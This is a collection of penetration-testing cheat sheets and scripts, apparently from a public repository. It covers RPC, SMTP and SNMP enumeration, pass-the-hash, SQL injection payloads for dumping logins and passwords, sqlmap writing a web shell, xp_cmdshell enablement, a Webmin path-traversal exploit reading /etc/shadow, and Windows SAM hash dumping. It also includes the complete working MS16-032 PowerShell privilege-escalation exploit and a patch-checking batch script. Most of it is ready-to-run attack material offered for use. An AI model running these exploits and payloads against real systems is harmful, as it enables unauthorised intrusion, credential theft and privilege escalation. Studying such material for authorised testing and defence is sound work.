Connect to an RPC share without a username and password and enumerate priviledges 

`rpcclient --user="" --command=enumprivs -N 172.20.10.5`

Connect to an RPC share with a username and enumerate privledges 

`rpcclient --user="<Username>" --command=enumprivs 172.20.10.5`

### rpcinfo



---
File: /CheatSheets/shell/readme.md
---

# Windows Shell

## pth-winexe

### With Pass

pht-winexe -U <user>%<pass> //Target_IP cmd

`pth-winexe -U bob%alice //172.10.1.60 cmd`

### Pass The Hash 

`pth-winexe -U bob%hash //172.16.1.60 cmd`




---
File: /CheatSheets/SMTP/readme.md
---

# SMTP

### netcat

Enum Users

`nc -vn target 25`

`VRFY User_to_test`

`VRFY root`
answer = 252 2.0.0 root means That this user Exist here.

`VRFY bla`
answer = 550 5.1.1 means that bla doesn't exist here.

## Got users and Pass?

### Reading emails using Telnet

telnet Ip_target port

```
$telnet 172.20.10.2 110
USER username
PASS password

list

retr 1

```





---
File: /CheatSheets/SNMP/readme.md
---

# SNMP

### Fixing SNMP output

`apt-get install snmp-mibs-downloader download-mibs` 

`echo "" > /etc/snmp/snmp.conf`

### OneSixtyone

onesixtyone -c COMMUNITY -i Target_ip

`onesixtyone -c community.txt -i Found_ips.txt`

### snmpwalk

Walking MIB's

snmpwalk  -c COMMUNITY -v VERSION target_ip

`snmpwalk -c public -v1 192.168.25.77`

specific MIB node
snmpwalk -c community -v version Target IP MIB Node
Example: USER ACCOUNTS = 1.3.6.1.4.1.77.1.2.25

`snmpwalk -c public -v1 192.168..25.77 1.3.6.1.4.1.77.1.2.25`

### snmp-check

snmp-check -t target_IP | snmp-check -t TARGET -c COMMUNITY

`snmp-check -t 172.20.10.5`

`snmp-check -t 172.20.10.5 -c public`

### Automate the username enumeration process for SNMPv3

`apt-get install snmp snmp-mibs-downloader`

`wget https://raw.githubusercontent.com/raesene/TestingScripts/master/snmpv3enum.rb`

### NMAP SNMPv3 Enumeration 

`nmap -sV -p 161 --script=snmp-info 172.20.10.0/24`


### Default Credentials

/usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt







---
File: /CheatSheets/SQLI/barehands/readme.md
---

# SQLI tricks

## GET

### Error-Based

### Simple test

`Adding a simpe quote '`

Example: `http://192.168.1.104/Less-1/?id=5'`

### Fuzzing

Sorting columns to find maximum column

`http://192.168.1.104/Less-1/?id=-1 order by 1`

`http://192.168.1.104/Less-1/?id=-1 order by 2`

`http://192.168.1.104/Less-1/?id=-1 order by 3`

(until it stop returning errors)

---


### Finding what column is injectable

**mysql**
`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, 3` (using the same amount of columns you got on the previous step)

**postgresql**
`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, NULL` (using the same amount of columns you got on the previous step)

 one of the columns will be printed with the respective number

---


#### Finding version

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, version()` **mysql**
`http://192.168.1.104/Less-1/?id=-1 union select NULL, NULL, version()` **postgres**s


#### Finding database name

`http://192.168.1.104/Less-1/?id=-1 union select 1,2, database()` **mysql**

`http://192.168.1.104/Less-1/?id=-1 union select NULL,NULL, database()` **postgres**


#### Finding usernames logged in

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, current_user()` **mysql**


#### Finding databases

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, schema_name from information_schema.schemata` **mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, datname from pg_database` **postgres**


#### Finding table names from a database

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, table_name from information_schema.tables where table_schema="database_name"` **mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, tablename from pg_tables where table_catalog="database_name"` **postgres**


#### Finding column names from a table

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, column_name from information_schema.columns where table_schema="database_name" and table_name="tablename"` **mysql**

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, column_name from information_schema.columns where table_catalog="database_name" and table_name="tablename"` **postgres**

#### Concatenate

Example:

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, login from users;`
`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, password from users;`

in one query

`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, concat(login,':',password) from users;` **mysql**
`http://192.168.1.104/Less-1/?id=-1 union select 1, 2, login||':'||password from users;` **postgres**


### Error Based SQLI (USUALLY MS-SQL)

#### Current user

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(user_name() as varchar(4096)))--`


#### DBMS version

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(@@version as varchar(4096)))--`


#### Database name

`http://192.168.1.104/Less-1/?id=-1 or db_name(0)=0 --`


#### Tables from a database

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U')--`

---

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM dbname..sysobjects where xtype='U' AND name NOT IN ('previouslyFoundTable',...))--`


#### Columns within a table


`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename')--`

> remember to change **dbname** and **tablename** accordingly with the given situation
> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(dbname..syscolumns.name as varchar(4096)) FROM dbname..syscolumns, dbname..sysobjects WHERE dbname..syscolumns.id=dbname..sysobjects.id AND dbname..sysobjects.name = 'tablename' AND dbname..syscolumns.name NOT IN('previously found column name', ...))--`


#### Actual data


`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename)--`

> after each iteration a new column name will be found, make sure add it to ** previously found column name ** separated by comma as on the next sample

`http://192.168.1.104/Less-1/?id=-1 or 1 in (SELECT TOP 1 CAST(columnName as varchar(4096)) FROM tablename AND name NOT IN('previously found row data'))--`


#### Shell commands

`EXEC master..xp_cmdshell <command>`

> you need yo be 'sa' user

#### Enabling shell commands

`EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_congigure 'xp_shell', 1; RECONFIGURE;`



---
File: /CheatSheets/SQLI/sqlmap/readme.md
---

# SQLI tricks

## GET

### Error-Based

### Simple test

`Adding a simpe quote '`

Example: `http://192.168.1.104/Less-1/?id=5'`

### Checking Privileges

Using Sql-map

`./sqlmap.py -u http://localhost/Less-1/?id=1 --privileges | grep FILE`

### Reading file

`./sqlmap.py -u <URL> --file-read=<file to read>`

`./sqlmap.py -u http://localhost/Less-1/?id=1 --file-read=/etc/passwd`

### Writing file

`./sqlmap.py -u <url> --file-write=<file> --file-dest=<path>`

`./sqlmap.py -u http://localhost/Less-1/?id=1 --file-write=shell.php --file-dest=/var/www/html/shell-php.php`

## POST

`./sqlmap.py -u <POST-URL> --data="<POST-paramters> "`

`./sqlmap.py -u http://localhost/Less-11/ --data "uname=teste&passwd=&submit=Submit" -p uname`

You can also use a file like with the post request:


`./sqlmap.py -r post-request.txt -p uname`







---
File: /CheatSheets/ssh/readme.md
---

# SSH

## Tunnels

### Simple ssh tunnel

ssh -L <src_port>:target:<dest_port> <user>@tunnel_ip -p <port>

`ssh -L 3389:10.0.0.1:3389  user@192.168.101.11 -p 2222`

### Creating VPN tunnel through ssh to any subnet

sshuttle -e "ssh <-i id_rsa_priv.key>" -r  user@tunnel_ip <subnet/CIDR> <Another_subnet/CIDR> &

`sshuttle -e "ssh -i bob.key" -r  bob@10.0.1.1 192.168.1.0/24 192.168.25.0/24 &`



---
File: /CheatSheets/webmin/readme.md
---

# Webmin

`export ip=172.20.10.5`

### Test for LFI & file disclosure vulnerability by grabbing /etc/passwd

Some servers can change root path, just change the URL path...

`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd`

### Test to see if webmin is running as root by grabbing /etc/shadow

`curl http://$ip:10000//unauthenticated/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/shadow`


## You can use John to break it

unshadow passwd shadow > Hash

### Resources
* [CVE: CVE-2006-3392](https://www.exploit-db.com/exploits/2017/)


---
File: /CheatSheets/windows/enumaration/readme.md
---

# Windows OS Enumaration

## System Information

`systeminfo`

`systeminfo | findstr /B /C:"OS Name" /C:"OS Version"`

## users

`net users`

## Info about a user

`net user USER`

Change USER PASSWORD

`net user USER NEW_PASSWORD`

add User

net users USER /add

## Adding a user into a group

`net group Administrators USER /add`

`net localgroup Administrators USER /add`

`net group "Remote Desktop User" USER /add`

## groups

`net groups`

`net localgroups`

## Whoami

`whoami`

`whoami /all`

## Network info

IP / Interfaces

`ipconfig /all`

Routes

`route print`

ARP table

`arp -A` 

## List process

`tasklist`

## Query current drives on system

`fsutil fsinfo drives`


## RDP

list users that can use RDP

`qwinsta`






---
File: /CheatSheets/windows/hashdump/readme.md
---

# Windows HashDump without metasploit

##  Windows Passwords

### Reg Commands to get passwords' file

System file 

`reg save HKLM\System system.hive`

SAM File 

`reg save HKLM\SAM sam.hive`


### HASHDUMP

`samdump2 system.hive sam.hive`


#### Windows Repair

Backup files < Windows 2003

`c:\windows\repair`

Donwload sam and system.

`bkhive system key.txt`
`samdump2 sam key.txt`


### FGDump

Kali Path:  /usr/share/windows-binaries/fgdump/fgdump.exe


### WCE

Kali Paths:
* /usr/share/wce/wce32.exe
* /usr/share/wce/wce64.exe
* /usr/share/wce/wce-universal.exe

Get pass

`wce-universal.exe `

Try to get pass into clear text

`wce-universal.exe -w`









---
File: /CheatSheets/windows/priv_esc/Invoke-MS16-032.ps1
---

function Invoke-MS16-032 {
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	
	[StructLayout(LayoutKind.Sequential)]
	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;
		public IntPtr hThread;
		public int dwProcessId;
		public int dwThreadId;
	}
	
	[StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
	public struct STARTUPINFO
	{
		public Int32 cb;
		public string lpReserved;
		public string lpDesktop;
		public string lpTitle;
		public Int32 dwX;
		public Int32 dwY;
		public Int32 dwXSize;
		public Int32 dwYSize;
		public Int32 dwXCountChars;
		public Int32 dwYCountChars;
		public Int32 dwFillAttribute;
		public Int32 dwFlags;
		public Int16 wShowWindow;
		public Int16 cbReserved2;
		public IntPtr lpReserved2;
		public IntPtr hStdInput;
		public IntPtr hStdOutput;
		public IntPtr hStdError;
	}
	
	[StructLayout(LayoutKind.Sequential)]
	public struct SQOS
	{
		public int Length;
		public int ImpersonationLevel;
		public int ContextTrackingMode;
		public bool EffectiveOnly;
	}
	
	public static class Advapi32
	{
		[DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
		public static extern bool CreateProcessWithLogonW(
			String userName,
			String domain,
			String password,
			int logonFlags,
			String applicationName,
			String commandLine,
			int creationFlags,
			int environment,
			String currentDirectory,
			ref  STARTUPINFO startupInfo,
			out PROCESS_INFORMATION processInformation);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool SetThreadToken(
			ref IntPtr Thread,
			IntPtr Token);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenThreadToken(
			IntPtr ThreadHandle,
			int DesiredAccess,
			bool OpenAsSelf,
			out IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public static extern bool OpenProcessToken(
			IntPtr ProcessHandle, 
			int DesiredAccess,
			ref IntPtr TokenHandle);
			
		[DllImport("advapi32.dll", SetLastError=true)]
		public extern static bool DuplicateToken(
			IntPtr ExistingTokenHandle,
			int SECURITY_IMPERSONATION_LEVEL,
			ref IntPtr DuplicateTokenHandle);
	}
	
	public static class Kernel32
	{
		[DllImport("kernel32.dll")]
		public static extern uint GetLastError();
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentProcess();
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern IntPtr GetCurrentThread();
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern int GetThreadId(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError = true)]
		public static extern int GetProcessIdOfThread(IntPtr handle);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int SuspendThread(IntPtr hThread);
		
		[DllImport("kernel32.dll",SetLastError=true)]
		public static extern int ResumeThread(IntPtr hThread);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool TerminateProcess(
			IntPtr hProcess,
			uint uExitCode);
	
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool CloseHandle(IntPtr hObject);
		
		[DllImport("kernel32.dll", SetLastError=true)]
		public static extern bool DuplicateHandle(
			IntPtr hSourceProcessHandle,
			IntPtr hSourceHandle,
			IntPtr hTargetProcessHandle,
			ref IntPtr lpTargetHandle,
			int dwDesiredAccess,
			bool bInheritHandle,
			int dwOptions);
	}
	
	public static class Ntdll
	{
		[DllImport("ntdll.dll", SetLastError=true)]
		public static extern int NtImpersonateThread(
			IntPtr ThreadHandle,
			IntPtr ThreadToImpersonate,
			ref SQOS SecurityQualityOfService);
	}
"@
	
	function Get-ThreadHandle {
		# StartupInfo Struct
		$StartupInfo = New-Object STARTUPINFO
		$StartupInfo.dwFlags = 0x00000100 # STARTF_USESTDHANDLES
		$StartupInfo.hStdInput = [Kernel32]::GetCurrentThread()
		$StartupInfo.hStdOutput = [Kernel32]::GetCurrentThread()
		$StartupInfo.hStdError = [Kernel32]::GetCurrentThread()
		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
		
		# ProcessInfo Struct
		$ProcessInfo = New-Object PROCESS_INFORMATION
		
		# CreateProcessWithLogonW --> lpCurrentDirectory
		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
		
		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, "C:\Windows\System32\cmd.exe", "",
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
		
		# Duplicate handle into current process -> DUPLICATE_SAME_ACCESS
		$lpTargetHandle = [IntPtr]::Zero
		$CallResult = [Kernel32]::DuplicateHandle(
			$ProcessInfo.hProcess, 0x4,
			[Kernel32]::GetCurrentProcess(),
			[ref]$lpTargetHandle, 0, $false,
			0x00000002)
		
		# Clean up suspended process
		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)
		
		$lpTargetHandle
	}
	
	function Get-SystemToken {
		echo "`n[?] Thread belongs to: $($(Get-Process -PID $([Kernel32]::GetProcessIdOfThread($hThread))).ProcessName)"
	
		$CallResult = [Kernel32]::SuspendThread($hThread)
		if ($CallResult -ne 0) {
			echo "[!] $hThread is a bad thread, exiting.."
			Return
		} echo "[+] Thread suspended"
		
		echo "[>] Wiping current impersonation token"
		$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, [IntPtr]::Zero)
		if (!$CallResult) {
			echo "[!] SetThreadToken failed, exiting.."
			$CallResult = [Kernel32]::ResumeThread($hThread)
			echo "[+] Thread resumed!"
			Return
		}
		
		echo "[>] Building SYSTEM impersonation token"
		# SecurityQualityOfService struct
		$SQOS = New-Object SQOS
		$SQOS.ImpersonationLevel = 2 #SecurityImpersonation
		$SQOS.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($SQOS)
		# Undocumented API's, I like your style Microsoft ;)
		$CallResult = [Ntdll]::NtImpersonateThread($hThread, $hThread, [ref]$sqos)
		if ($CallResult -ne 0) {
			echo "[!] NtImpersonateThread failed, exiting.."
			$CallResult = [Kernel32]::ResumeThread($hThread)
			echo "[+] Thread resumed!"
			Return
		}
		
		# Null $SysTokenHandle
		$script:SysTokenHandle = [IntPtr]::Zero

		# 0x0006 --> TOKEN_DUPLICATE -bor TOKEN_IMPERSONATE
		$CallResult = [Advapi32]::OpenThreadToken($hThread, 0x0006, $false, [ref]$SysTokenHandle)
		if (!$CallResult) {
			echo "[!] OpenThreadToken failed, exiting.."
			$CallResult = [Kernel32]::ResumeThread($hThread)
			echo "[+] Thread resumed!"
			Return
		}
		
		echo "[?] Success, open SYSTEM token handle: $SysTokenHandle"
		echo "[+] Resuming thread.."
		$CallResult = [Kernel32]::ResumeThread($hThread)
	}
	
	# main() <--- ;)
	$ms16032 = @"
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by Jens Lindström ]
"@
	
	$ms16032
	
	# Check logical processor count, race condition requires 2+
	echo "`n[?] Operating system core count: $([System.Environment]::ProcessorCount)"
	if ($([System.Environment]::ProcessorCount) -lt 2) {
		echo "[!] Race condition requires at least 2 CPU cores, exiting!`n"
		Return
	}
	
	echo "[>] Duplicating CreateProcessWithLogonW handle"
	$hThread = Get-ThreadHandle
	
	# If no thread handle is captured, the box is patched
	if ($hThread -eq 0) {
		echo "[!] No valid thread handle was captured, exiting!`n"
		Return
	} else {
		echo "[?] Done, using thread handle: $hThread"
	} echo "`n[*] Sniffing out privileged impersonation token.."
	
	# Get handle to SYSTEM access token
	Get-SystemToken
	
	# If we fail a check in Get-SystemToken, exit
	if ($SysTokenHandle -eq 0) {
		Return
	}
	
	echo "`n[*] Sniffing out SYSTEM shell.."
	echo "`n[>] Duplicating SYSTEM token"
	$hDuplicateTokenHandle = [IntPtr]::Zero
	$CallResult = [Advapi32]::DuplicateToken($SysTokenHandle, 2, [ref]$hDuplicateTokenHandle)
	
	# Simple PS runspace definition
	echo "[>] Starting token race"
	$Runspace = [runspacefactory]::CreateRunspace()
	$StartTokenRace = [powershell]::Create()
	$StartTokenRace.runspace = $Runspace
	$Runspace.Open()
	[void]$StartTokenRace.AddScript({
		Param ($hThread, $hDuplicateTokenHandle)
		while ($true) {
			$CallResult = [Advapi32]::SetThreadToken([ref]$hThread, $hDuplicateTokenHandle)
		}
	}).AddArgument($hThread).AddArgument($hDuplicateTokenHandle)
	$AscObj = $StartTokenRace.BeginInvoke()
	
	echo "[>] Starting process race"
	# Adding a timeout (10 seconds) here to safeguard from edge-cases
	$SafeGuard = [diagnostics.stopwatch]::StartNew()
	while ($SafeGuard.ElapsedMilliseconds -lt 10000) {

		# StartupInfo Struct
		$StartupInfo = New-Object STARTUPINFO
		$StartupInfo.cb = [System.Runtime.InteropServices.Marshal]::SizeOf($StartupInfo) # Struct Size
		
		# ProcessInfo Struct
		$ProcessInfo = New-Object PROCESS_INFORMATION
		
		# CreateProcessWithLogonW --> lpCurrentDirectory
		$GetCurrentPath = (Get-Item -Path ".\" -Verbose).FullName
		
		# LOGON_NETCREDENTIALS_ONLY / CREATE_SUSPENDED
		$CallResult = [Advapi32]::CreateProcessWithLogonW(
			"user", "domain", "pass",
			0x00000002, "C:\Windows\System32\cmd.exe", "",
			0x00000004, $null, $GetCurrentPath,
			[ref]$StartupInfo, [ref]$ProcessInfo)
		
		#---
		# Make sure CreateProcessWithLogonW ran successfully! If not, skip loop.
		#---
		# Missing this check used to cause the exploit to fail sometimes.
		# If CreateProcessWithLogon fails OpenProcessToken won't succeed
		# but we obviously don't have a SYSTEM shell :'( . Should be 100%
		# reliable now!
		#---
		if (!$CallResult) {
			continue
		}
			
		$hTokenHandle = [IntPtr]::Zero
		$CallResult = [Advapi32]::OpenProcessToken($ProcessInfo.hProcess, 0x28, [ref]$hTokenHandle)
		# If we can't open the process token it's a SYSTEM shell!
		if (!$CallResult) {
			echo "[!] Holy Handle Leak Potato, we have a SYSTEM shell !!!!!!`n"
			echo "[!] 637 fuck3d w1nd0w5 `n"
			$CallResult = [Kernel32]::ResumeThread($ProcessInfo.hThread)
			$StartTokenRace.Stop()
			$SafeGuard.Stop()
			Return
		}
			
		# Clean up suspended process
		$CallResult = [Kernel32]::TerminateProcess($ProcessInfo.hProcess, 1)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hProcess)
		$CallResult = [Kernel32]::CloseHandle($ProcessInfo.hThread)

	}
	
	# Kill runspace & stopwatch if edge-case
	$StartTokenRace.Stop()
	$SafeGuard.Stop()
}


---
File: /CheatSheets/windows/priv_esc/readme.md
---

# Windows Privilege Escalation

## Exploit ms16_032
wget  [Invoke-MS16-032.ps1](https://github.com/kitsun3sec/Pentest-Cheat-Sheets/tree/master/CheatSheets/windows/priv_esc/Invoke-MS16-032.ps1)

#### Upload it to the target and through the powershell command line execute:
```bash
> powershell -ExecutionPolicy Bypass
> Import-Module .\Invoke-MS16-032.ps1
> Invoke-MS16-032
```
##### Done, if everything worked fine, you're now system user.

## WinPrivCheck.bat

##### Upload it to the target and run through terminal

```cmd
WinPrivCheck.bat
```


---
File: /CheatSheets/windows/priv_esc/WinPrivCheck.bat
---

@echo off

rem #---------------------------------------------------------------------------------#
rem # Name         = Windows Privilege Escalation Check v1.0                          #
rem # Reference    = http://www.fuzzysecurity.com/tutorials/16.html                   #
rem # Author       = @ihack4falafel                                                   #
rem # Date         = 9/18/2017                                                        #
rem # Tested On    = Windows XP SP3 - Professional                                    #
rem #                Windows 7 SP1  - Entrprise                                       #
rem #                Windows 10     - Professional                                    #
rem # Usage        = WinPrivCheck.bat                                                 #
rem # Requirements = accesschk.exe(old version) - sysinternals                        #
rem #---------------------------------------------------------------------------------#


@echo off
rem Used rem instead of echo for cleaner output.
@echo on

rem #----------#
rem # Hostname #
rem #----------#

@echo off

hostname

@echo on

rem #----------#
rem # Username #
rem #----------#

@echo off

echo %username% 2>NUL
whoami 2>NUL
echo %userprofile% 2>NUL

@echo on 

rem #-----------#
rem # OS Verion #
rem #-----------#

@echo off

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"

@echo on 

rem #--------------------#
rem # Installed Software #
rem #--------------------#

@echo off

wmic product get Name, Version

@echo on

rem #-----------------#
rem # Available Users #
rem #-----------------#

@echo off

net users

@echo on

rem #----------------#
rem # Network Config #
rem #----------------#

@echo off

ipconfig /all

@echo on 

rem #--------------#
rem # Route Config #
rem #--------------#

@echo off

route print

@echo on 

rem #-----------#
rem # ARP Cache #
rem #-----------#

@echo off

arp -a

@echo on 

rem #---------------------#
rem # Network Connections #
rem #---------------------#

@echo off

netstat -ano

@echo on 

rem #-------------------#
rem # Firewall Settings #
rem #-------------------#

@echo off

netsh firewall show state 
netsh firewall show config 

@echo on 

rem #------------------#
rem # Running Services #
rem #------------------#

@echo off

net start

@echo on 

rem #------------------------#
rem # Local PrivEsc Exploits #
rem #------------------------#

@echo off

rem Given this script is for all versions of Windows, I'd reference the results with the below matrix to avoid false postives.


rem #----------------------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem #    Exploits Index    | 2K      | XP    | 2K3   | 2K8     | Vista   | 7   |                           Title                       |
rem #----------------------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB2592799 | MS11-080 |    X    | SP3   | SP3   |    X    |    X    |  X  | afd.sys                  - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB3143141 | MS16-032 |    X    |   X   |   X   | SP1/2   | SP2     | SP1 | Secondary Logon          - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB2393802 | MS11-011 |    X    | SP2/3 | SP2   | SP2     | SP1/2   | SP0 | WmiTraceMessageVa        - Local privilege Escalation | 
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB982799  | MS10-059 |    X    |   X   |   X   | ALL     | ALL     | SP0 | Chimichurri              - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB979683  | MS10-021 | SP4     | SP2/3 | SP2   | SP2     | SP0/1/2 | SP0 | Windows Kernel           - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB2305420 | MS10-092 |    X    |   X   |   X   | SP0/1/2 | SP1/2   | SP0 | Task Scheduler           - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB981957  | MS10-073 |    X    | SP2/3 | SP2   | SP2     | SP1/2   | SP0 | Keyboard Layout          - Local privilege Escalation | 
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB4013081 | MS17-017 |    X    |   X   |   X   | SP2     | SP2     | SP1 | Registry Hive Loading    - Local privilege Escalation | 
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB977165  | MS10-015 | ALL     | ALL   | ALL   | ALL     | ALL     | ALL | User Mode to Ring        - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB941693  | MS08-025 | SP4     | SP2   | SP1/2 | SP0     | SP0/1   |  X  | win32k.sys               - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB920958  | MS06-049 | SP4     |   X   |   X   |    X    |    X    |  X  | ZwQuerySysInfo           - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB914389  | MS06-030 | ALL     | SP2   |   X   |    X    |    X    |  X  | Mrxsmb.sys               - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB908523  | MS05-055 | SP4     |   X   |   X   |    X    |    X    |  X  | APC Data-Free            - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB890859  | MS05-018 | SP3/4   | SP1/2 |   X   |    X    |    X    |  X  | CSRSS                    - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB842526  | MS04-019 | SP2/3/4 |   X   |   X   |    X    |    X    |  X  | Utility Manager          - Local privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB835732  | MS04-011 | SP2/3/4 | SP0/1 |   X   |    X    |    X    |  X  | LSASS service BoF        - Remote Code Execution      | 
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB841872  | MS04-020 | SP4     |   X   |   X   |    X    |    X    |  X  | POSIX                    - Local Privilege Escalation |
rem #----------------------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB2975684 | MS14-040 |    X    |   X   | SP2   | SP2     | SP2     | SP1 | afd.sys Dangling Pointer - Local Privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB3136041 | MS16-016 |    X    |   X   |   X   | SP1/2   | SP2     | SP1 | WebDAV to Address        - Local Privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------# 
rem # KB3057191 | MS15-051 |    X    |   X   | SP2   | SP2     | SP2     | SP1 | win32k.sys               - Local Privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#
rem # KB2989935 | MS14-070 |    X    |   X   | SP2   |    X    |    X    |  X  | TCP/IP                   - Local Privilege Escalation |
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------# 
rem # KB2503665 | MS11-046 |    X    |  SP3  | SP2   |  SP1/2  |  SP1/2  | SP1 | 'afd.sys'                - Local Privilege Escalation |  
rem #-----------#----------#---------#-------#-------#---------#---------#-----#-------------------------------------------------------#

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2592799" | find /i "KB2592799" 1>NUL
IF not errorlevel 1 (
    
  echo MS11-080 patch is installed :(

) ELSE (

  echo MS11-080 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB3143141" | find /i "KB3143141" 1>NUL
IF not errorlevel 1 (
    
  echo MS16-032 patch is installed :(

) ELSE (

  echo MS16-032 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB2393802" | find /i "KB2393802" 1>NUL
IF not errorlevel 1 (
    
  echo MS11-011 patch is installed :(

) ELSE (

  echo MS11-011 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB982799" | find /i "KB982799" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-059 patch is installed :(

) ELSE (

  echo MS10-059 patch is NOT installed! 

)

wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:"KB979683" | find /i "KB979683" 1>NUL
IF not errorlevel 1 (
    
  echo MS10-021 patch is installed :(

) ELSE (

  echo MS10-021 patch is NOT installed! 

)

